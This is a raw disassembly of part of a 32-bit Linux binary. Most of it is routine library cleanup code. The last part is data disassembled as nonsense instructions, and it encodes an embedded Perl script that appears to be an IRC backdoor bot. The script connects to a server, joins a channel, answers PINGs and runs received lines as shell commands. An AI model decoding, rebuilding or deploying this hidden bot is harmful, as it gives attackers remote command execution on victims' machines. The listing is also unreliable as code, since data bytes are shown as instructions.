mov eax, dword [var_a8h]
mov dword [var_8h], edx
mov edx, dword [var_a4h]
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.080912c0
mov dword [var_9ch], 0
mov esi, eax
mov dword [var_78h], eax
mov eax, dword [arg_10h]
add esi, dword [eax]
mov dword [var_7ch], esi
mov dword [var_70h], esi
nop
lea edx, [var_3ch]
lea eax, [var_70h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov edx, dword [arg_ch]
mov dword [esp], edx
call fcn.080913e0
mov edx, dword [var_88h]
mov dword [var_14h], eax
mov eax, dword [var_84h]
mov dword [var_ch], edx
mov edx, dword [var_a8h]
mov dword [var_10h], eax
mov eax, dword [var_8ch]
mov dword [var_4h], edx
mov dword [var_8h], eax
mov eax, dword [var_a4h]
mov dword [esp], eax
call fcn.080912c0
test eax, eax
mov ebx, eax
je 0x80919ae
mov ecx, dword [var_70h]
cmp ecx, dword [var_7ch]
mov edi, ecx
je 0x809175d
dec dword [var_80h]
je 0x809174b
xor eax, eax
lea ecx, [ebx + edi]
mov dword [var_7ch], esi
cmp dword [var_1ch], 0
mov dword [var_70h], ecx
mov esi, edi
setne al
mov dword [var_9ch], eax
jmp 0x80916c0
mov edx, 0xffffffff
add esp, 0xc0
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
cmp ecx, esi
je 0x8091727
mov eax, dword [var_1ch]
test eax, eax
js 0x8091783
cmp dword [var_98h], 0
jl 0x8091995
setne dl
test eax, eax
setne al
xor eax, edx
test al, 1
je 0x8091727
test ebx, ebx
jne 0x80917f8
mov eax, dword [var_1ch]
cmp dword [var_98h], eax
je 0x80917f8
mov edi, dword [var_98h]
test edi, edi
js 0x80917f8
test eax, eax
js 0x80917f8
mov esi, 0x786156
cmp ecx, 0x81692401
mov eax, 0xff879eaa
cmovle esi, eax
mov ebx, 1
lea edi, [var_74h]
mov eax, ebx
mov edx, dword [arg_ch]
mov dword [var_4h], edi
imul eax, esi
mov dword [esp], edx
sub ecx, eax
lea eax, [var_6ch]
mov dword [var_74h], ecx
mov dword [var_8h], eax
call fcn.080913e0
mov eax, dword [var_98h]
cmp dword [var_4ch], eax
je 0x8091934
inc ebx
cmp ebx, 3
jg 0x80917f5
mov ecx, dword [var_70h]
jmp 0x80917bb
mov ecx, dword [var_70h]
mov eax, ecx
mov edx, dword [arg_10h]
sub eax, dword [var_78h]
mov dword [edx], eax
mov eax, dword [var_3ch]
cmp dword [var_b0h], eax
je 0x8091855
mov esi, dword [var_84h]
mov ebx, dword [var_b0h]
xor edx, edx
sub ebx, dword [var_84h]
test esi, esi
jne 0x8091830
cmp eax, 0x3c
mov eax, 1
cmove edx, eax
lea eax, [edx + ebx]
lea edx, [var_70h]
add ecx, eax
mov dword [esp], edx
lea eax, [var_3ch]
mov dword [var_70h], ecx
mov dword [var_4h], eax
call dword [arg_ch]
mov edx, 0xffffffff
test eax, eax
je 0x8091750
fild dword [ebp - 0xa0]
fild dword [ebp - 0x94]
fld dword [0x80a737c]
fxch st(1)
faddp st(2)
fild dword [ebp - 0x28]
fsubp st(2)
fild dword [ebp - 0x90]
fxch st(2)
fmul dword [0x80a7374]
faddp st(2)
fild dword [ebp - 0x8c]
fxch st(2)
fmul dword [0x80a7378]
faddp st(2)
fild dword [ebp - 0x88]
fxch st(2)
fmul st(1)
faddp st(2)
fild dword [ebp - 0xb0]
fxch st(2)
fmulp st(1)
faddp st(1)
fldz
fucompi st(1)
jbe 0x809192a
fld qword [0x80a7380]
fucompi st(1)
fstp st(0)
ja 0x809174b
cmp dword [var_a4h], 0x45
je 0x8091915
mov ecx, dword [var_70h]
mov eax, dword [var_3ch]
mov edx, dword [arg_8h]
mov dword [edx], eax
mov eax, dword [var_38h]
mov dword [edx + 4], eax
mov eax, dword [var_34h]
mov dword [edx + 8], eax
mov eax, dword [var_30h]
mov dword [edx + 0xc], eax
mov eax, dword [var_2ch]
mov dword [edx + 0x10], eax
mov eax, dword [var_28h]
mov dword [edx + 0x14], eax
mov eax, dword [var_24h]
mov dword [edx + 0x18], eax
mov eax, dword [var_20h]
mov dword [edx + 0x1c], eax
mov eax, dword [var_1ch]
mov dword [edx + 0x20], eax
mov eax, dword [var_18h]
mov dword [edx + 0x24], eax
mov eax, dword [var_bp_14h]
mov dword [edx + 0x28], eax
mov edx, ecx
jmp 0x8091750
mov ecx, dword [var_70h]
mov edx, 0xffffffff
cmp ecx, 0x2a300
jbe 0x80918ca
jmp 0x8091750
fld qword [0x80a7388]
fxch st(1)
jmp 0x80918b4
mov eax, dword [var_84h]
lea edx, [var_6ch]
mov dword [var_14h], edx
mov edx, dword [var_88h]
mov dword [var_10h], eax
mov eax, dword [var_8ch]
mov dword [var_ch], edx
mov edx, dword [var_a8h]
mov dword [var_8h], eax
mov eax, dword [var_a4h]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.080912c0
lea edx, [var_3ch]
add eax, dword [var_74h]
mov dword [var_8h], edx
mov edx, dword [arg_ch]
mov dword [esp], edx
mov dword [var_70h], eax
lea eax, [var_70h]
mov dword [var_4h], eax
call fcn.080913e0
jmp 0x80917f5
test eax, eax
setne al
movzx eax, al
cmp dword [var_9ch], eax
jg 0x8091727
jmp 0x8091783
mov ecx, dword [var_70h]
jmp 0x8091783
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
call fcn.0808eae0
mov eax, dword [arg_8h]
mov dword [var_8h], 0x80aabcc
mov dword [var_4h], fcn.08091260
mov dword [esp], eax
call fcn.08091500
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x68
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov ebx, section..ctors
mov eax, dword [section..ctors]
cmp eax, 0xffffffff
je 0x8091a4c
lea esi, [esi]
lea edi, [edi]
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x8091a40
pop eax
pop ebx
pop ebp
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebp
mov edx, 1
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx]
test eax, eax
jne 0x8091b9e
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
add eax, 4
mov dword [esp], eax
call fcn.08091b80
xor edx, edx
test al, al
je 0x8091b97
mov edx, dword [ebx]
xor eax, eax
mov ecx, dword [edx]
cmp eax, ecx
jae 0x8091bcc
lea esi, [esi]
cmp dword [edx + eax*8 + 0xc], 0
jne 0x8091be1
inc eax
cmp eax, ecx
jb 0x8091bc0
mov dword [esp], edx
call fcn.08051180
mov dword [ebx], 0
mov edx, 1
jmp 0x8091b97
xor edx, edx
jmp 0x8091b97
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x80aac24]
test eax, eax
jne 0x8091c17
mov eax, dword [0x80aabdc]
test eax, eax
jne 0x8091c0a
leave
ret
add eax, 4
mov dword [esp], eax
call fcn.08091b80
jmp 0x8091c08
mov ecx, dword [0x80a95b8]
mov eax, dword [0x80aac08]
cmp dword [ecx + 4], eax
jne 0x8091bff
mov eax, dword [0x80aac04]
mov edx, dword [ecx]
mov dword [0x80aac24], 0
mov dword [ecx], eax
mov dword [esp], edx
call fcn.08051180
jmp 0x8091bff
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 4
mov esi, dword [arg_8h]
mov ecx, dword [esi + 0xc]
cmp edi, ecx
jae 0x8091d15
mov edx, dword [esi + 8]
xor ebx, ebx
mov esi, esi
mov eax, dword [edx + ebx + 8]
test eax, eax
jle 0x8091cb0
mov eax, dword [edx + ebx + 0x20]
test eax, eax
jne 0x8091cf8
inc edi
add ebx, 0x3c
cmp edi, ecx
jb 0x8091ca0
mov eax, dword [edx + 0xc]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [esi + 0xc]
mov eax, edx
shl eax, 4
sub eax, edx
shl eax, 2
add eax, dword [esi + 8]
mov eax, dword [eax - 0x2c]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [esi + 8]
mov dword [esp], eax
call fcn.08051180
mov dword [arg_8h], esi
add esp, 4
pop ebx
pop esi
pop edi
leave
jmp fcn.08051180
mov dword [esp], eax
call fcn.08083520
mov edx, dword [esi + 8]
lea eax, [ebx + edx]
mov dword [esp], eax
call dword [edx + ebx + 0x20]
mov ecx, dword [esi + 0xc]
mov edx, dword [esi + 8]
jmp 0x8091cb0
mov edx, dword [esi + 8]
jmp 0x8091cb8
lea esi, [esi]
push ebp
mov ebp, esp
push ebx
mov ebx, eax
sub esp, 4
mov eax, dword [eax + 0x14]
test eax, eax
jne 0x8091d5f
mov eax, dword [ebx + 0x1c]
test eax, eax
jne 0x8091d58
mov edx, ebx
mov ebx, dword [ebx + 0x18]
mov eax, dword [edx + 0x10]
cmp byte [eax], 0x2f
je 0x8091d4e
test ebx, ebx
jne 0x8091d37
add esp, 4
pop ebx
leave
ret
mov dword [esp], edx
call fcn.08051180
jmp 0x8091d44
call fcn.08091d20
jmp 0x8091d37
call fcn.08091d20
jmp 0x8091d30
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 8
call fcn.08091f50
call fcn.080921c0
mov eax, dword [0x80aaca0]
test eax, eax
jne 0x8091db6
mov eax, dword [0x80aac84]
test eax, eax
jne 0x8091daf
mov eax, dword [0x80aa85c]
test eax, eax
jne 0x8091d9d
leave
ret
mov dword [var_4h], fcn.08091c80
mov dword [esp], eax
call fcn.0807a7f0
jmp 0x8091d9b
call fcn.08091d20
jmp 0x8091d92
mov dword [var_4h], fcn.08051180
mov dword [esp], eax
call fcn.0807a7f0
jmp 0x8091d89
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [0x80aacac]
test eax, eax
je 0x8091df0
cmp eax, 0x80aa880
je 0x8091df0
mov dword [esp], eax
call fcn.08051180
mov esi, esi
leave
ret
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebp
mov ebp, esp
sub esp, 8
mov ecx, dword [0x80aa890]
test ecx, ecx
je 0x8091e1f
mov eax, dword [0x80aa888]
mov dword [esp], eax
call fcn.08051180
leave
ret
mov eax, dword [0x80aa88c]
mov dword [var_4h], eax
mov eax, dword [0x80aa888]
mov dword [esp], eax
call fcn.08054780
jmp 0x8091e1d
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x77], dl
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x8091e5f
mov dword [arg_8h], ebx
mov ebx, dword [var_4h]
leave
jmp fcn.08051180
mov dword [esp], eax
call fcn.08083790
jmp 0x8091e53
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x80aa894]
mov dword [var_4h], fcn.08091e40
mov dword [esp], eax
call fcn.0807a7f0
mov dword [0x80aa894], 0
leave
ret
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x77], dl
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov edi, dword [arg_10h]
mov esi, dword [arg_8h]
cmp dword [arg_ch], edi
mov ebx, dword [esi*4 + 0x80aace0]
je 0x8091f0e
mov eax, dword [esi*4 + 0x8093f20]
mov dword [esi*4 + 0x80a9a40], edi
test eax, eax
jne 0x8091f45
mov eax, dword [esi*4 + 0x80a9a80]
cmp eax, 0x80a0139
je 0x8091f0e
mov dword [esp], eax
call fcn.08051180
mov dword [esi*4 + 0x80a9a80], 0x80a0139
test ebx, ebx
je 0x8091f3d
mov eax, dword [ebx + 8]
mov esi, ebx
test eax, eax
je 0x8091f24
cmp eax, edi
je 0x8091f24
call fcn.0805e410
mov ebx, dword [ebx + 0xc]
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08051180
mov dword [esp], esi
call fcn.08051180
test ebx, ebx
jne 0x8091f12
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
call eax
jmp 0x8091eed
lea esi, [esi]
push ebp
mov ebp, esp
push esi
mov esi, 0
push ebx
xor ebx, ebx
sub esp, 0xc
nop
cmp ebx, 6
je 0x8091f91
test esi, esi
je 0x8091fc0
mov dword [esp], 3
call section.
mov edx, eax
mov eax, dword [ebx*4 + 0x80a99c0]
mov dword [var_8h_2], eax
mov eax, dword [edx + ebx*4]
mov dword [esp], ebx
mov dword [var_ch], eax
call fcn.08091ec0
inc ebx
cmp ebx, 0xc
jle 0x8091f60
mov eax, dword [0x80a9a98]
cmp eax, 0x80a0139
je 0x8091fb5
mov dword [esp], eax
call fcn.08051180
mov dword [0x80a9a98], 0x80a0139
add esp, 0xc
pop ebx
pop esi
leave
jmp 0x8092000
mov edx, dword [0x80a9ab4]
jmp 0x8091f77
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edi, dword [0x80aa920]
test edi, edi
je 0x8092052
mov esi, edi
xor ebx, ebx
mov edi, dword [edi]
mov eax, dword [esi + 4]
mov dword [esp], eax
call fcn.08051180
cmp ebx, 6
je 0x8092040
mov eax, dword [esi + ebx*4 + 8]
mov edx, dword [eax + 0x10]
test edx, edx
jne 0x80920c0
mov dword [esp], eax
call fcn.08051180
inc ebx
cmp ebx, 0xc
jle 0x8092024
mov dword [esp], esi
call fcn.08051180
test edi, edi
jne 0x8092013
mov eax, dword [0x80aa8a0]
mov dword [0x80aa920], 0
test eax, eax
je 0x80920b8
cmp eax, 0x80aa8a4
jne 0x80920cb
mov eax, dword [0x80aa8ac]
mov dword [0x80aa8a0], 0
mov dword [var_4h], eax
mov eax, dword [0x80aa8a4]
mov dword [esp], eax
call fcn.08054780
mov esi, dword [0x80aa8b0]
test esi, esi
je 0x80920b8
mov ebx, esi
mov esi, dword [esi + 0xc]
mov eax, dword [ebx + 8]
mov dword [var_4h], eax
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08054780
mov dword [esp], ebx
call fcn.08051180
test esi, esi
jne 0x8092096
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
call edx
mov eax, dword [esi + ebx*4 + 8]
jmp 0x8092038
mov dword [var_ch], str._nl_archive_subfreeres
mov dword [var_8h], 0x212
mov dword [var_4h], str.loadarchive.c
mov dword [esp], str.archmapped__headmap
call fcn.0805efc0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [var_77h], dl
in eax, 0x53
sub esp, 8
mov eax, dword [0x80aad20]
test eax, eax
je 0x8092147
mov ebx, eax
mov eax, dword [eax]
mov dword [0x80aad20], eax
mov eax, dword [ebx + 4]
cmp eax, 0x80a01a1
je 0x809212b
mov dword [esp], eax
call fcn.08051180
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call fcn.08051180
mov dword [esp], ebx
call fcn.08051180
mov eax, dword [0x80aad20]
test eax, eax
jne 0x8092110
mov eax, dword [0x80a9ac0]
cmp eax, str.messages
je 0x809215b
mov dword [esp], eax
call fcn.08051180
mov eax, dword [0x80aa944]
mov dword [var_4h_2], fcn.08051180
mov dword [esp], eax
call fcn.0807a7f0
mov edx, dword [0x80aa948]
mov dword [0x80aa944], 0
test edx, edx
jne 0x809218a
add esp, 8
pop ebx
leave
ret
mov eax, edx
mov edx, dword [edx]
mov dword [esp], eax
mov dword [0x80aa948], edx
call fcn.08051180
mov edx, dword [0x80aa948]
test edx, edx
jne 0x809218a
jmp 0x8092184
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 4
mov ebx, dword [0x80aa94c]
test ebx, ebx
je 0x80921f4
mov eax, dword [ebx + 8]
mov esi, ebx
test eax, eax
jne 0x8092200
mov ebx, dword [ebx + 0xc]
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08051180
mov dword [esp], esi
call fcn.08051180
test ebx, ebx
jne 0x80921d2
add esp, 4
pop ebx
pop esi
leave
ret
nop
lea esi, [esi]
call fcn.08092240
jmp 0x80921db
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x77], dl
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, eax
mov eax, dword [eax + 0x44]
cmp eax, 0x80a9b04
je 0x809225a
call fcn.08062900
mov eax, ebx
call fcn.08060690
mov eax, dword [ebx + 0x10]
test eax, eax
jne 0x8092299
mov eax, dword [ebx + 4]
test eax, eax
je 0x809228d
mov eax, dword [ebx + 8]
mov dword [var_sp_4h], eax
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08054780
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08051180
jmp 0x8092280
mov dword [esp], eax
call fcn.08051180
jmp 0x8092268
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x77], dl
push ebp
mov ebp, esp
sub esp, 8
call fcn.08063710
mov eax, dword [0x80aa99c]
mov dword [var_4h], fcn.08051180
mov dword [esp], eax
call fcn.0807a7f0
mov dword [0x80aa99c], 0
leave
ret
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 4
mov ebx, dword [0x80aac68]
cmp ebx, dword [0x80aac50]
je 0x809232a
mov eax, ebx
mov ebx, dword [ebx]
mov dword [esp], eax
call fcn.08051180
cmp ebx, dword [0x80aac50]
jne 0x8092316
mov esi, dword [0x80aac58]
test esi, esi
je 0x809235c
mov eax, dword [esi + 0x14]
mov ebx, dword [eax + 4]
mov dword [eax + 4], 0
test ebx, ebx
je 0x8092355
mov eax, ebx
mov ebx, dword [ebx + 4]
mov edx, dword [eax + 8]
test edx, edx
je 0x8092363
test ebx, ebx
jne 0x8092345
mov esi, dword [esi + 0xc]
test esi, esi
jne 0x8092334
add esp, 4
pop ebx
pop esi
leave
ret
mov dword [esp], eax
call fcn.08051180
jmp 0x8092351
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp - 0x77], dl
push ebp
mov ebp, esp
sub esp, 4
mov edx, dword [0x80aaae0]
test edx, edx
jne 0x80923a9
mov eax, dword [0x80aaae4]
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aaae4], 0
leave
ret
mov eax, edx
mov edx, dword [edx]
mov dword [esp], eax
mov dword [0x80aaae0], edx
call fcn.08051180
mov edx, dword [0x80aaae0]
test edx, edx
jne 0x80923a9
jmp 0x8092390
add byte [ebp - 0x77], dl
push ebp
mov ebp, esp
push ebx
call fcn.080923d1
pop ebx
add ebx, 0x17873
push edx
call fcn.08048190
mov ebx, dword [var_4h]
leave
ret
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], al
add eax, dword [eax]
add byte [eax], al
add dword [eax], eax
add al, byte [eax]
and esp, dword [ecx]
das
jne 0x8092480
jb 0x809243e
bound ebp, qword [ecx + 0x6e]
das
jo 0x809247a
jb 0x8092483
or ah, byte [ebx]
push 0x223d6e61
and esi, dword [eax]
js 0x8092445
cmp esp, dword [esi + ebp*2]
imul esp, dword [ebx + 0x6b], 0x226b223d
cmp esp, dword [ebx + esi*2]
jb 0x80924a9
jb 0x8092473
and ch, byte [ecx + 0x72]
xor ebp, dword [ecx + 0x70]
outsb dx, byte cs:[esi]
je 0x8092463
cmp esp, dword [ebx + edx*2]
dec ecx
inc edi
jnp 0x809249c
inc ebp
push edx
dec ebp
jge 0x809248a
jnp 0x80924cc
cmp esp, dword [ebp + 0x78]
imul esi, dword [eax + 0x69], 0x6f662066
jb 0x80924c7
cmp esi, dword [ebp + 0x73]
and byte gs:[ecx + 0x4f], cl
cmp bh, byte [edx]
push ebx
outsd dx, dword [esi]
arpl word [ebx + 0x65], bp
je 0x80924a7
and al, 0x73
outsd dx, dword [esi]
arpl word [ebx + 0x20], bp
cmp eax, 0x3a4f4920
cmp dl, byte [ebx + 0x6f]
arpl word [ebx + 0x65], bp
je 0x80924b9
cmp cl, byte [ecx + 0x4e]
inc ebp
push esp
sub eax, 0x77656e3e
sub byte [ebx + esi*2], ah
jb 0x8092505
jb 0x80924c0
and bh, byte [edx]
aaa
and ch, byte [ecx]
jl 0x8092518
js 0x8092508
je 0x80924dc
jo 0x8092515
imul ebp, dword [esi + 0x74], 0x6f732420
arpl word [ebx + 0x20], bp
and dl, byte [ebp + 0x53]
inc ebp
push edx
and byte [ebx + 0x20], ch
sub ebp, dword [ecx + 0x20]
imul esp, dword [eax], 0x3a
imul esi, dword [esi + 0x31], 0x5c
outsb dx, byte [esi]
dec esi
dec ecx
inc ebx
dec ebx
and byte [ebx + 0x5c], ch
outsb dx, byte [esi]
and bh, byte [ebx]
and al, 0x69
cmp eax, 0x68773b31
imul ebp, dword [ebp + 0x28], 0x6f73243c
arpl word [ebx + 0x3e], bp
cmp eax, 0x5b5e2f7e
pop esi
and byte [ebp + 0x2b], bl
and byte [eax], ch
pop ebx
pop esi
and byte [ebp + 0x2b], bl
sub dword [eax], esp
das
sub dword [ebx + 0x24], edi
insd dword es:[edi], dx
outsd dx, dword [esi]
cmp eax, 0x6c3b3124
popal
jae 0x8092572
and byte [ecx + 0x66], ch
and byte [ebp*2 + 0x3d65646f], ah
cmp eax, 0x31303022
and bh, byte [ebx]
imul esp, dword [esi + 0x28], 0x646f6d24
cmp eax, 0x3334223d
xor esp, dword [edx]
sub dword [ebx + 0x24], edi
imul ebp, dword [ebx], 0x6e243b2b
imul esp, dword [ebx + 0x6b], 0x2f737e3d
pop esp
sub ah, byte fs:[edi + ebp]
and al, 0x69
das
cmp esi, dword [eax + 0x72]
imul ebp, dword [esi + 0x74], 0x6f732420
arpl word [ebx + 0x20], bp
and cl, byte [esi + 0x49]
inc ebx
dec ebx
and byte [esi + ebp*2], ah
imul esp, dword [ebx + 0x6b], 0x3b226e5c
jge 0x80925d1
jo 0x80925c8
imul ebp, dword [esi + 0x74], 0x6f732420
arpl word [ebx + 0x20], bp
and cl, byte [edx + 0x4f]
dec ecx
dec esi
and byte [ebx], ah
push 0x6e5c6e61
push eax
push edx
dec ecx
push esi
dec ebp
push ebx
inc edi
and byte [ebx], ah
push 0x3a206e61
dec eax
imul ebx, dword [esi + ebp*2 + 0x22], 0x6968773b
insb byte es:[edi], dx
sub byte gs:[esp], bh
jae 0x80925fb
arpl word [ebx + 0x3e], bp
sub dword [ebx + 0x69], edi
and byte [eax], ch
das
pop esi
push eax
dec ecx
dec esi
inc edi
and byte [eax], ch
sub ch, byte cs:[ecx]
and al, 0x2f
sub dword [ebx + 0x70], edi
jb 0x8092610
outsb dx, byte [esi]
je 0x80925ca
and al, 0x73
outsd dx, dword [esi]
arpl word [ebx + 0x20], bp
and dl, byte [eax + 0x4f]
dec esi
inc edi
and byte [ecx + esi], ah
pop esp
outsb dx, byte [esi]
dec edx
dec edi
dec ecx
dec esi
and byte [ebx], ah
push 0x6e5c6e61
and bh, byte [ebx]
jge 0x8092633
sub byte [ebx + 0x2f], dh
pop esi
pop ebx
pop esi
and byte [ebp + 0x2b], bl
and byte [eax + 0x52], dl
dec ecx
push esi
dec ebp
push ebx
inc edi
and byte [ebx], ah
push 0x3a206e61
and al, 0x6e
imul esp, dword [ebx + 0x6b], 0x3a205e5b
pop esp
ja 0x809264d
sub bh, byte [edx]
pop ebx
pop esi
and byte [edx], bh
pop esp
ja 0x8092656
sub ah, byte [eax]
sub byte [esi], ch
sub ch, byte [ecx]
and al, 0x2f
and al, 0x31
das
sub dword [ebx + 0x73], edi
das
pop esp
jae 0x8092635
and al, 0x2f
das
cmp esp, dword [edi + ebx*2]
cmp eax, 0x605f2460
cmp esp, dword [esi + 0x6f]
jb 0x8092680
popal
arpl word [eax + 0x28], bp
jae 0x8092691
insb byte es:[edi], dx
imul esi, dword [eax + 0x22], 0x29226e5c
jnp 0x809269c
jb 0x8092697
outsb dx, byte [esi]
je 0x8092651
and al, 0x73
outsd dx, dword [esi]
arpl word [ebx + 0x20], bp
and dl, byte [eax + 0x52]
dec ecx
push esi
dec ebp
push ebx
inc edi
and byte [ebx], ah
push 0x3a206e61
and al, 0x5f
pop esp
outsb dx, byte [esi]
and bh, byte [ebx]
jae 0x80926bb
